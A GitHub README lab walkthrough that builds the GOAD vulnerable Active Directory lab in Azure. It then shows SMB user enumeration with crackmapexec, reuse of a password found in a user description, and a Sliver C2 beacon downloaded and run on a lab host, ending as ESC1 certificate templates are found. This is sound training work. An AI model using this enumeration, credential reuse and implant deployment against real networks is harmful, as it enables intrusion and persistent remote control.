# GOAD-Azure-Active-Directory-Pen-Testing-Lab
Guide to setting up GOAD in Azure and spawning a Sliver Beacon Implant - Free Pen Testing Lab (30 days to smash it out 😁)

First things first we need to setup an account in Azure. This gives us a free account with $200 to spend.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/1c1ff9de-2128-4d4d-9170-1b99e4323635)

You will need to provide a bank card for verification and to charge billing payments to but fear not, we are setting this up for free and the whole lab will be free, for 30 days anyway.

Next we need to upgrade the free account to a pay as you go account. This gives us access to more vCPUs per region and more B Series Burstable Virtual Machine Sizes to build the lab. GOAD requires we have 12 B Series vCPUS to use which isnt default when setting up an Azure account.

Follow this link - `https://learn.microsoft.com/en-us/azure/cost-management-billing/manage/upgrade-azure-subscription`

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/6bcf993f-5143-4c58-aa41-089424e357d7)

This will happen automatically once you have followed the above. Next we need to request extra resources for your Azure Account. When an account is first created, Azure only allows you 10 vCPUs per Region and 10 BSeries vCPUs. I assume this is to prevent fraud or you unknowingly racking up more charges than you can realistically afford.

Go to your account and search subscriptions.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/0640636d-fe9e-41d2-8a8f-4288007631b5)

Select your subscription and go to usage and quotas which is under `settings`

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/09d7d463-ca1c-43d0-84fe-eaf6cf23046e)

Here you can see the resource quotas you are assigned. Your vCPU per region and B Series will be 10. Mine is now 14 and 12 respectively but you will need to click `New Quota Request in the top left`

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/ffe24b86-729e-470a-8ada-104218f70328)

Now heres the lame part, you should be able to adjust the vCPUs per region straight away, the B Series in the other hand requires you opening a ticket with Microsoft. This is painless as its just a few clicks but it does take few days to get the quota adjusted.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/bec63b31-1a14-4a48-92af-c45053465db6)

Once we have that we are good to go and can now build the GOAD Active Directory Lab in Azure.

## GOAD - Game of Active Directory 

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/22a632de-41d4-44e6-9ce8-bca93937a77a)

Built by Mayfly at Orange CyberDefense (Much appreciated Mayfly - Great Work!) it is described as
`GOAD is a pentest active directory LAB project. The purpose of this lab is to give pentesters a vulnerable Active directory environment ready to use to practice usual attack techniques.`

Here is the link - https://github.com/Orange-Cyberdefense/GOAD/tree/main

With that in mind, lets get cracking.

First we need to ensure we have Azure CLI installed. Go ahead and get that installed.

```bash
sudo apt install azure-cli
```

Here is the link for installing on Linux if needed - https://learn.microsoft.com/en-us/cli/azure/install-azure-cli-linux?pivots=apt

Now thats installed simply run `az login`

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ az login
```

This will spawn a browser session for you to authenticate to azure with your credentials. Enter your creds and then you are authenticated and can now interact with your Azure account through the command line.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/a9092544-4f6a-4e07-bba8-e9184c12de3e)


We also need terraform installed to run the terraform script and build the lab.

```bash
# sudo apt install terraform
```

### Clone the GOAD Repo

git clone the GOAD repo over to your machine

```bash
# git clone https://github.com/Orange-Cyberdefense/GOAD.git
```
Mayfly has made the install super simple, head over to here https://github.com/Orange-Cyberdefense/GOAD/blob/main/docs/install_with_azure.md and follow the instruction. Essentially you are just running

```bash
./goad.sh -t install -l GOAD -p azure
```

Now go and make a coffee, this will take a while as all the Domain, Users, Groups, Trusts and Services etc need to be built and applied.

## Lets Gooooooooooo

Once that has finished and you have'nt encountered any errors you will be presented with a IP for the Ubuntu Jump Server and the location of your SSH Private Key for logging in.

Mine is at `/GOAD/ad/GOAD/providers/azure/ssh_keys` 

Move it over to your Desktop if you want and SSH in. Username is `goad`

```bash
┌──(kali㉿kali)-[~]
└─$ ssh -i Desktop/ubuntu-jumpbox.pem goad@13.80.243.***
Welcome to Ubuntu 22.04.3 LTS (GNU/Linux 6.2.0-1016-azure x86_64)
```

### Recon

Running `ip add` shows us the IP assigned and the subnet we are on in the internal network. Our IP is 192.168.56.100 and subnet is 255.255.255.0

```bash
goad@ubuntu-jumpbox:~$ ip ad
1: lo: <LOOPBACK,UP,LOWER_UP> mtu 65536 qdisc noqueue state UNKNOWN group default qlen 1000
    link/loopback 00:00:00:00:00:00 brd 00:00:00:00:00:00
    inet 127.0.0.1/8 scope host lo
       valid_lft forever preferred_lft forever
    inet6 ::1/128 scope host 
       valid_lft forever preferred_lft forever
2: eth0: <BROADCAST,MULTICAST,UP,LOWER_UP> mtu 1500 qdisc mq state UP group default qlen 1000
    link/ether 00:0d:3a:af:62:51 brd ff:ff:ff:ff:ff:ff
    inet 192.168.56.100/24 metric 100 brd 192.168.56.255 scope global eth0
       valid_lft forever preferred_lft forever
    inet6 fe80::20d:3aff:feaf:6251/64 scope link 
       valid_lft forever preferred_lft forever
```


Run a quick ping sweep to find some alive hosts - Im using pingMe.sh which is a quick subnet ping sweep tool I knocked up https://github.com/deeexcee-io/pingMe. Feel free to use it or any other tool you prefer.

```bash
goad@ubuntu-jumpbox:~/pingMe$ bash pingMe.sh 

[+] Scanning subnets
[+] 192.168.56.10 is up
[+] 192.168.56.100 is up
[+] 192.168.56.11 is up
[+] 192.168.56.12 is up
[+] 192.168.56.22 is up
[+] 192.168.56.23 is up
```

We have 6 Hosts return a response. 192.168.56.100 is ours so there are 5 hosts that respond to ping on the network.

Next we need to run crackmapexec. This will give us plenty of information about the hostnames and the Domains in use.

As we dont have crackmapexec installed on the ubuntu box, we could install the tools we need or, a better option in my opinion is to setup a Dynamic SSH Tunnel through the Ubuntu Box from our Kali Machine. This way we have the majority of the tools needed at our disposal and can use proxychains to forward the traffic.

We will be installing sliver on the ubuntu jump hosts as proxying beacons will be a pain but the rest of the tools we will just use on our local kali host.

First check the configuration of your proxychains file `tail /etc/proxychains4.conf`. My socks4 conf is set to 127.0.0.1 on port 1080

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ tail /etc/proxychains4.conf
#       proxy types: http, socks4, socks5, raw
#         * raw: The traffic is simply forwarded to the proxy without modification.
#        ( auth types supported: "basic"-http  "user/pass"-socks )
#
[ProxyList]
# add proxy here ...
# meanwile
# defaults set to "tor"
socks4  127.0.0.1 1080
```
The port can be any port you want as long as it is not already in use. I'm going to leave mine as 1080.

Now lets setup our Dynamic SSH Tunnel. To do this we need a few options

```bash
-D 1080 - Tells SSH to setup a dymanic Tunnel, listening on Port 1080
-N      - This states we dont not want to run a command when the tunnel is established
-f      - This forks or backgrounds the tunnel
-i      - Private key file to use
```

Here is the whole command

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ssh -D 1080 -N -f -i ubuntu-jumpbox.pem goad@13.80.243.***
```

We can check it has worked by running `ss -tulpn`

```bash
┌──(kali㉿kali)-[~/Desktop]
└─$ ss -tulpn                                                 
Netid  State   Recv-Q  Send-Q        Local Address:Port   Peer Address:Port Process                          
tcp    LISTEN  0       128               127.0.0.1:1080        0.0.0.0:*     users:(("ssh",pid=77870,fd=5))  
tcp    LISTEN  0       50       [::ffff:127.0.0.1]:7474              *:*                                     
tcp    LISTEN  0       128                   [::1]:1080           [::]:*     users:(("ssh",pid=77870,fd=4))  
tcp    LISTEN  0       4096     [::ffff:127.0.0.1]:7687              *:*
```

As shown, the tunnel has been established on 127.0.0.1:1080

With the hosts we found earlier in a txt file, lets give that to crackmapexec, run it over proxychains and see what we get back.

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains -q crackmapexec smb hosts.txt
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
```

So looking at the results we have 2 Domains (essos.local and devenkingdoms.local), we also have 1 subdomain (north.sevenkingdoms.local)

and also five hostnames
* WINTERFELL
* MEEREEN
* KINGSLANDING
* BRAAVOS
* CASTLEBLACK

WINTERFELL, MEEREEN and KINGSLANDING all have SMB Signing Enabled. This points to them possibly being Domain Controllers due to that being the default setting for DCs. The other 2 are potentially workstations/servers.

Lets do some more recon and see if guest access is enabled on any of the shares, unlikely to see this but it does happen.

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains -q crackmapexec smb hosts.txt -u '' -p ''
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\: 
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\: 
SMB         192.168.56.23   445    BRAAVOS          [-] essos.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\: 
SMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
```

It appears that .10, .11 and .12 allow some sort of anonymous interaction.

Lets see if we can get a list of users in the Domains.

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains -q crackmapexec smb hosts.txt -u '' -p '' --users    
SMB         192.168.56.12   445    MEEREEN          [*] Windows 10.0 Build 14393 x64 (name:MEEREEN) (domain:essos.local) (signing:True) (SMBv1:False)
SMB         192.168.56.23   445    BRAAVOS          [*] Windows 10.0 Build 14393 x64 (name:BRAAVOS) (domain:essos.local) (signing:False) (SMBv1:False)
SMB         192.168.56.11   445    WINTERFELL       [*] Windows 10.0 Build 17763 x64 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.22   445    CASTELBLACK      [*] Windows 10.0 Build 17763 x64 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (signing:False) (SMBv1:False)
SMB         192.168.56.10   445    KINGSLANDING     [*] Windows 10.0 Build 17763 x64 (name:KINGSLANDING) (domain:sevenkingdoms.local) (signing:True) (SMBv1:False)
SMB         192.168.56.12   445    MEEREEN          [+] essos.local\: 
SMB         192.168.56.23   445    BRAAVOS          [-] essos.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.12   445    MEEREEN          [-] Error enumerating domain users using dc ip 192.168.56.12: NTLM needs domain\username and a password
SMB         192.168.56.12   445    MEEREEN          [*] Trying with SAMRPC protocol
SMB         192.168.56.23   445    BRAAVOS          [-] Error enumerating domain users using dc ip 192.168.56.23: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         192.168.56.23   445    BRAAVOS          [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] north.sevenkingdoms.local\: 
SMB         192.168.56.11   445    WINTERFELL       [-] Error enumerating domain users using dc ip 192.168.56.11: NTLM needs domain\username and a password
SMB         192.168.56.11   445    WINTERFELL       [*] Trying with SAMRPC protocol
SMB         192.168.56.22   445    CASTELBLACK      [-] north.sevenkingdoms.local\: STATUS_ACCESS_DENIED 
SMB         192.168.56.22   445    CASTELBLACK      [-] Error enumerating domain users using dc ip 192.168.56.22: SMB SessionError: STATUS_ACCESS_DENIED({Access Denied} A process has requested access to an object but has not been granted those access rights.)
SMB         192.168.56.22   445    CASTELBLACK      [*] Trying with SAMRPC protocol
SMB         192.168.56.10   445    KINGSLANDING     [+] sevenkingdoms.local\: 
SMB         192.168.56.10   445    KINGSLANDING     [-] Error enumerating domain users using dc ip 192.168.56.10: NTLM needs domain\username and a password
SMB         192.168.56.10   445    KINGSLANDING     [*] Trying with SAMRPC protocol
SMB         192.168.56.11   445    WINTERFELL       [+] Enumerated domain user(s)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\Guest                          Built-in account for guest access to the computer/domain
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\arya.stark                     Arya Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sansa.stark                    Sansa Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\brandon.stark                  Brandon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\rickon.stark                   Rickon Stark
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\hodor                          Brainless Giant
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jon.snow                       Jon Snow
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\samwell.tarly                  Samwell Tarly (Password : Heartsbane)
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\jeor.mormont                   Jeor Mormont
SMB         192.168.56.11   445    WINTERFELL       north.sevenkingdoms.local\sql_svc                        sql service
```

Awesome, we can get all users and there is also a password stored in the user attributes.

samwell.tarly:Heartsbane

Lets see where these can be used, I want an RDP Session as its easier to work with. Use crackmapexec with rdp and the creds.

```bash
└─$ proxychains -q crackmapexec rdp hosts.txt -u samwell.tarly -p Heartsbane
RDP         192.168.56.22   3389   CASTELBLACK      [*] Windows 10 or Windows Server 2016 Build 17763 (name:CASTELBLACK) (domain:north.sevenkingdoms.local) (nla:True)
RDP         192.168.56.23   3389   BRAAVOS          [*] Windows 10 or Windows Server 2016 Build 14393 (name:BRAAVOS) (domain:essos.local) (nla:True)
RDP         192.168.56.11   3389   WINTERFELL       [*] Windows 10 or Windows Server 2016 Build 17763 (name:WINTERFELL) (domain:north.sevenkingdoms.local) (nla:True)
RDP         192.168.56.12   3389   MEEREEN          [*] Windows 10 or Windows Server 2016 Build 14393 (name:MEEREEN) (domain:essos.local) (nla:True)
RDP         192.168.56.10   3389   KINGSLANDING     [*] Windows 10 or Windows Server 2016 Build 17763 (name:KINGSLANDING) (domain:sevenkingdoms.local) (nla:True)
RDP         192.168.56.22   3389   CASTELBLACK      [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane (Pwn3d!)
RDP         192.168.56.23   3389   BRAAVOS          [-] essos.local\samwell.tarly:Heartsbane 
RDP         192.168.56.11   3389   WINTERFELL       [+] north.sevenkingdoms.local\samwell.tarly:Heartsbane 
RDP         192.168.56.12   3389   MEEREEN          [-] essos.local\samwell.tarly:Heartsbane (STATUS_LOGON_FAILURE)
RDP         192.168.56.10   3389   KINGSLANDING     [-] sevenkingdoms.local\samwell.tarly:Heartsbane (STATUS_LOGON_FAILURE)
```
Cool, so we can RDP and samwell.tarly is also a local admin on .22 (Pwn3ed!)

Use xfreerdp over proxychains and mount a local folder to make transferring files easy.
`proxychains xfreerdp  /drive:kali,/home/kali /u:samwell.tarly /v:192.168.56.22`

Enter Y to accept the certificate then enter the password

```bash
┌──(kali㉿kali)-[~/GOAD]
└─$ proxychains xfreerdp  /drive:kali,/home/kali /u:samwell.tarly /v:192.168.56.22
[proxychains] config file found: /etc/proxychains4.conf
[proxychains] preloading /usr/lib/x86_64-linux-gnu/libproxychains.so.4
[proxychains] DLL init: proxychains-ng 4.16
[proxychains] Strict chain  ...  127.0.0.1:1080  ...  192.168.56.22:3389  ...  OK
[12:19:17:669] [138186:138188] [INFO][com.freerdp.crypto] - creating directory /home/kali/.config/freerdp
[12:19:17:669] [138186:138188] [INFO][com.freerdp.crypto] - creating directory [/home/kali/.config/freerdp/certs]
[12:19:17:669] [138186:138188] [INFO][com.freerdp.crypto] - created directory [/home/kali/.config/freerdp/server]
[12:19:17:774] [138186:138188] [WARN][com.freerdp.crypto] - Certificate verification failure 'self-signed certificate (18)' at stack position 0
[12:19:17:774] [138186:138188] [WARN][com.freerdp.crypto] - CN = castelblack.north.sevenkingdoms.local
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - @           WARNING: CERTIFICATE NAME MISMATCH!           @
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - @@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@@
[12:19:17:775] [138186:138188] [ERROR][com.freerdp.crypto] - The hostname used for this connection (192.168.56.22:3389) 
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] - does not match the name given in the certificate:
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] - Common Name (CN):
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] -    castelblack.north.sevenkingdoms.local
[12:19:17:776] [138186:138188] [ERROR][com.freerdp.crypto] - A valid certificate for the wrong name should NOT be trusted!
Certificate details for 192.168.56.22:3389 (RDP-Server):
        Common Name: castelblack.north.sevenkingdoms.local
        Subject:     CN = castelblack.north.sevenkingdoms.local
        Issuer:      CN = castelblack.north.sevenkingdoms.local
        Thumbprint:  31:65:cd:a1:df:f2:5f:a1:ba:7a:4e:26:e0:6b:5c:0f:f6:ca:0e:21:eb:b3:3d:e0:9f:c2:bf:52:64:a0:26:ce
The above X.509 certificate could not be verified, possibly because you do not have
the CA certificate in your certificate store, or the certificate has expired.
Please look at the OpenSSL documentation on how to add a private CA to the store.
Do you trust the above certificate? (Y/T/N) Y
Password: 
[12:19:26:658] [138186:138188] [ERROR][com.winpr.timezone] - Unable to find a match for unix timezone: US/Eastern
[12:19:26:861] [138186:138188] [INFO][com.freerdp.gdi] - Local framebuffer format  PIXEL_FORMAT_BGRX32
```

We get presented with an RDP Session. Sweet. Lets get a Sliver Beacon and go from there.

![image](https://github.com/deeexcee-io/GOAD-Azure-Red-Team-Lab/assets/130473605/24222237-e783-4e64-b4ec-8c7dbe4c2ccd)

## Sliver


Free to use C2 Framework. I quite like it so far.

Head over to our ubuntu jump box.

Super easy to install just run `curl https://sliver.sh/install|sudo bash`

Then run `sliver`

```bash
└─$ sliver                                                      
Connecting to localhost:31337 ...

.------..------..------..------..------..------.
|S.--. ||L.--. ||I.--. ||V.--. ||E.--. ||R.--. |
| :/\: || :/\: || (\/) || :(): || (\/) || :(): |
| :\/: || (__) || :\/: || ()() || :\/: || ()() |
| '--'S|| '--'L|| '--'I|| '--'V|| '--'E|| '--'R|
`------'`------'`------'`------'`------'`------'

All hackers gain improvise
[*] Server v1.5.41 - f2a3915c79b31ab31c0c2f0428bbd53d9e93c54b
[*] Welcome to the sliver shell, please type 'help' for options

[*] Check for updates with the 'update' command

sliver >  
```

Lets install some extensions, type in `armory` to get a list of extensions we can use.

For now we are just going to install `.net-pivot` which includes tools such as rubeus and certify

```bash
sliver > armory install .net-pivot

[*] Installing alias 'KrbRelayUp' (v0.0.1) ... done!
[*] Installing alias 'Rubeus' (v0.0.22) ... done!
[*] Installing alias 'Certify' (v0.0.3) ... done!
[*] Installing alias 'SharpSecDump' (v0.0.1) ... done!
[*] Installing alias 'SharpChrome' (v0.0.2) ... done!
[*] Installing alias 'SharpDPAPI' (v0.0.2) ... done!
[*] Installing alias 'sqlrecon' (v0.0.2) ... done!
[*] Installing alias 'SharpLAPS' (v0.0.1) ... done!

sliver >  
```
### Sliver Implant

In sliver, generate a beacon 
```bash
sliver >  generate beacon --seconds 27 --jitter 3 --os windows --arch amd64 --http 192.168.56.100 --name beacon --save /tmp/beacon.exe

[*] Generating new windows/amd64 beacon implant binary (27s)
[*] Symbol obfuscation is enabled
[*] Build completed in 1m35s
[*] Implant saved to /tmp/beacon.exe

```

Now setup a job to await the connection from the beacon

```bash
sliver > http

[*] Starting HTTP :80 listener ...

---SNIP---

sliver > jobs

 ID   Name   Protocol   Port   Stage Profile 
==== ====== ========== ====== ===============
 1    http   tcp        80
```

Go back to the RDP Session and transfer the .exe over of call from SMB share

```powershell
PS C:\Users\samwell.tarly> iwr http://192.168.56.100:8080/beacon.exe -o beacon.exe
PS C:\Users\samwell.tarly> ls


    Directory: C:\Users\samwell.tarly


Mode                LastWriteTime         Length Name
----                -------------         ------ ----
d-r---       11/25/2023  10:56 AM                3D Objects
d-r---       11/25/2023  10:56 AM                Contacts
d-r---       11/25/2023  10:56 AM                Desktop
d-r---       11/25/2023  10:56 AM                Documents
d-r---       11/25/2023  10:56 AM                Downloads
d-r---       11/25/2023  10:56 AM                Favorites
d-r---       11/25/2023  10:56 AM                Links
d-r---       11/25/2023  10:56 AM                Music
d-r---       11/25/2023  10:56 AM                Pictures
d-r---       11/25/2023  10:56 AM                Saved Games
d-r---       11/25/2023  10:56 AM                Searches
d-r---       11/25/2023  10:56 AM                Videos
-a----       11/25/2023  11:06 AM       17221120 beacon.exe


PS C:\Users\samwell.tarly> .\beacon.exe
```
Check back in Sliver and we should have our beacon returned to us

```bash
[*] Beacon 17150820 beacon - 192.168.56.22:52761 (castelblack) - windows/amd64 - Sat, 25 Nov 2023 11:06:49 UTC

sliver > beacons

 ID         Name     Transport   Hostname      Username              Operating System   Last Check-In   Next Check-In 
========== ======== =========== ============= ===================== ================== =============== ===============
 17150820   beacon   http(s)     castelblack   NORTH\samwell.tarly   windows/amd64      28s             1s      
```

To interact with the beacon type `use` and the ID of the Beacon. As its a beacon and not an active session, Sliver will wait for the beacon to check in then task it with the commands to run, in this case `ls`

You can check which tasks are pending with the `tasks` command

```bash
sliver > use 17150820-11d0-406f-8500-61f8ee6dd515

[*] Active beacon beacon (17150820-11d0-406f-8500-61f8ee6dd515)

sliver (beacon) > ls

[*] Tasked beacon beacon (48588c0a)

sliver (beacon) > tasks

 ID         State     Message Type   Created                         Sent   Completed 
========== ========= ============== =============================== ====== ===========
 48588c0a   pending   Ls             Sat, 25 Nov 2023 11:08:00 UTC     

```

Now our Beacon is up and running lets look for some vulnerable AD CS Templates. 

First check certify is installed

```bash
sliver (beacon) > armory install certify

[*] Installing alias 'Certify' (v0.0.3) ... done!
```

Now task our Beacon with looking for vulnerable templates. As there are 2 Domains, check both sevenkingsoms.local and essos.local


```bash
sliver (beacon) > certify find /vulnerable /domain:sevenkingdoms.local

[*] Tasked beacon beacon (92ad8c97)

[+] beacon completed task 92ad8c97

[*] certify output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.1.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=sevenkingdoms,DC=local'

[*] Listing info about the Enterprise CA 'SEVENKINGDOMS-CA'

    Enterprise CA Name            : SEVENKINGDOMS-CA
    DNS Hostname                  : kingslanding.sevenkingdoms.local
    FullName                      : kingslanding.sevenkingdoms.local\SEVENKINGDOMS-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=SEVENKINGDOMS-CA, DC=sevenkingdoms, DC=local
    Cert Thumbprint               : CC0F0FAB15A69172D0316D67C16B82F4AF2EB09D
    Cert Serial                   : 348FD6202DDB689F4C266F9416C2C477
    Cert Start Date               : 11/23/2023 7:48:56 PM
    Cert End Date                 : 11/23/2028 7:58:56 PM
    Cert Chain                    : CN=SEVENKINGDOMS-CA,DC=sevenkingdoms,DC=local
    UserSpecifiedSAN              : Disabled
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Domain Admins   S-1-5-21-3592251176-3955304652-3429210345-512
      Allow  ManageCA, ManageCertificates               SEVENKINGDOMS\Enterprise AdminsS-1-5-21-3592251176-3955304652-3429210345-519
    Enrollment Agent Restrictions : None

[+] No Vulnerable Certificates Templates found!



Certify completed in 00:00:00.8200730
```

Now on essos.local

```bash
sliver (beacon) > certify find /vulnerable /domain:essos.local

[*] Tasked beacon beacon (6e899b21)

[+] beacon completed task 6e899b21

[*] certify output:

   _____          _   _  __              
  / ____|        | | (_)/ _|             
 | |     ___ _ __| |_ _| |_ _   _        
 | |    / _ \ '__| __| |  _| | | |      
 | |___|  __/ |  | |_| | | | |_| |       
  \_____\___|_|   \__|_|_|  \__, |   
                             __/ |       
                            |___./        
  v1.1.0                               

[*] Action: Find certificate templates
[*] Using the search base 'CN=Configuration,DC=essos,DC=local'

[*] Listing info about the Enterprise CA 'ESSOS-CA'

    Enterprise CA Name            : ESSOS-CA
    DNS Hostname                  : braavos.essos.local
    FullName                      : braavos.essos.local\ESSOS-CA
    Flags                         : SUPPORTS_NT_AUTHENTICATION, CA_SERVERTYPE_ADVANCED
    Cert SubjectName              : CN=ESSOS-CA, DC=essos, DC=local
    Cert Thumbprint               : 6C831117D04055B46B8119AB190A2E9F4BBB1D73
    Cert Serial                   : 17A6B46504EEABAA433B0FA7AEBD5075
    Cert Start Date               : 11/23/2023 7:49:01 PM
    Cert End Date                 : 11/23/2028 7:59:00 PM
    Cert Chain                    : CN=ESSOS-CA,DC=essos,DC=local
    [!] UserSpecifiedSAN : EDITF_ATTRIBUTESUBJECTALTNAME2 set, enrollees can specify Subject Alternative Names!
    CA Permissions                :
      Owner: BUILTIN\Administrators        S-1-5-32-544

      Access Rights                                     Principal

      Allow  Enroll                                     NT AUTHORITY\Authenticated UsersS-1-5-11
      Allow  ManageCA, ManageCertificates               BUILTIN\Administrators        S-1-5-32-544
      Allow  ManageCA, ManageCertificates               ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
      Allow  ManageCA, ManageCertificates               ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
    Enrollment Agent Restrictions : None

[!] Vulnerable Certificates Templates :

    CA Name                               : braavos.essos.local\ESSOS-CA
    Template Name                         : ESC1
    Schema Version                        : 2
    Validity Period                       : 1 year
    Renewal Period                        : 6 weeks
    msPKI-Certificate-Name-Flag          : ENROLLEE_SUPPLIES_SUBJECT
    mspki-enrollment-flag                 : NONE
    Authorized Signatures Required        : 0
    pkiextendedkeyusage                   : Client Authentication
    mspki-certificate-application-policy  : Client Authentication
    Permissions
      Enrollment Permissions
        Enrollment Rights           : ESSOS\Domain Users            S-1-5-21-2265185071-3335518114-134020291-513
        All Extended Rights         : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                      NT AUTHORITY\SYSTEM           S-1-5-18
      Object Control Permissions
        Owner                       : ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
        Full Control Principals     : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                      NT AUTHORITY\SYSTEM           S-1-5-18
        WriteOwner Principals       : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                      NT AUTHORITY\SYSTEM           S-1-5-18
        WriteDacl Principals        : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                      NT AUTHORITY\SYSTEM           S-1-5-18
        WriteProperty Principals    : ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Domain Admins           S-1-5-21-2265185071-3335518114-134020291-512
                                      ESSOS\Enterprise Admins       S-1-5-21-2265185071-3335518114-134020291-519
                                      NT AUTHORITY\SYSTEM           S-1-5-18

```

There are a few more vulnerable Certificate Templates but for this one we will be focussing on ESC1 - https://posts.specterops.io/certified-pre-owned-d95910965cd2




